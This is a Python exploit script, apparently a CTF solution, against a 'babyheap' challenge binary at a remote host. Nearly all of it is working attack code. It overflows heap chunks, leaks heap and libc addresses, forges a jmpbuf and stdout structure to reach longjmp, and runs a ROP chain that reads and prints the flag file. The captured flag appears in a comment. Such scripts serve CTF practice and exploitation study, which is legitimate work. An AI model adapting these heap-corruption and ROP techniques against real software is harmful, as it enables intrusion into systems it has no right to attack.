#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babyheap'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'111.186.59.11', 'port':11124})
env.select()

#==========

binf = ELF(bin_file)

libc = binf.libc
offset_libc_stdout  = 0xb03b8

fname = b'./flag'

#==========

def attack(conn, **kwargs):
    bh = BabyHeap(conn)

    bh.alloc(0) # 0
    bh.alloc(0) # 1
    bh.alloc(0) # 2
    bh.alloc(0) # 3
    bh.alloc(0) # 4
    bh.alloc(0) # 5

    exploit  = b'a'*0x10
    exploit += flat(0x21, 0x41)
    exploit += b'b'*0x30
    exploit += flat(0x41, 0x21)
    bh.update(0, 0xffffffff, exploit[:-1])

    bh.delete(1)

    fake  = b'B'*0x10
    fake += flat(0x1, 0x21)
    fake += b'C'*0x10
    fake += p64(0x21)
    bh.alloc(0x30, '') # 1
    bh.update(1, 0xffffffff, fake[:-1])

    bh.delete(2)
    bh.delete(4)

    leak = bh.view(1)[0x20:0x30]
    addr_heap_base = u64(leak[:8]) - 0x90
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    libc.address = u64(leak[8:]) - 0xb0a40
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_stdout    = libc.address + offset_libc_stdout
    addr_libc_system    = libc.sep_function['system']
    addr_libc_longjmp   = libc.symbols['longjmp']

    rop = ROP(libc)

    jmpbuf  = fname.ljust(0x30, b'\x00')
    jmpbuf += p64(addr_heap_base + 0x190)
    jmpbuf += p64(rop.ret.address)
    stdout  = jmpbuf.ljust(0x48, b'\x00')
    stdout += p64(addr_libc_longjmp)

    rop.open()
    rop.read(3, addr_heap_base, 0x100)
    rop.write(1, addr_heap_base, 0x100)

    bh.update(5, 0xffffffff, stdout.ljust(0xd0, b'\x00') + bytes(rop))

    exploit  = b'a'*0x10
    exploit += flat(0x21, 0x21)
    exploit += b'b'*0x10
    exploit += flat(0x21, 0x20)
    exploit += flat(addr_libc_stdout-0x18, addr_heap_base + 0xc0)
    bh.update(0, 0xffffffff, exploit[:-1])
    bh.delete(1)

    bh.exit()

class BabyHeap:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def alloc(self, size, content = ''):
        self.sendlineafter('Command: ', '1')
        self.sendlineafter('Size: ', str(size))
        if size > 0:
            self.sendlineafter('Content: ', content)

        res = re.match(r'.*Chunk (\d+) Allocated', self.recvuntil('\n1. Allocate', drop=True).decode())
        return int(res.group(1))

    def update(self, idx, size, content):
        self.sendlineafter('Command: ', '2')
        self.sendlineafter('Index: ', str(idx))
        self.sendlineafter('Size: ', str(size))
        self.sendlineafter('Content: ', content)

    def delete(self, idx):
        self.sendlineafter('Command: ', '3')
        self.sendlineafter('Index: ', str(idx))

    def view(self, idx):
        self.sendlineafter('Command: ', '4')
        self.sendlineafter('Index: ', str(idx))

        self.recvuntil(']: ')
        return self.recvuntil('\n1. ', drop=True)

    def exit(self):
        self.sendlineafter('Command: ', '5')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{0ld_mus1_n3ver_d1e_6dcd57ef}

if __name__=='__main__':
    main()

#==========
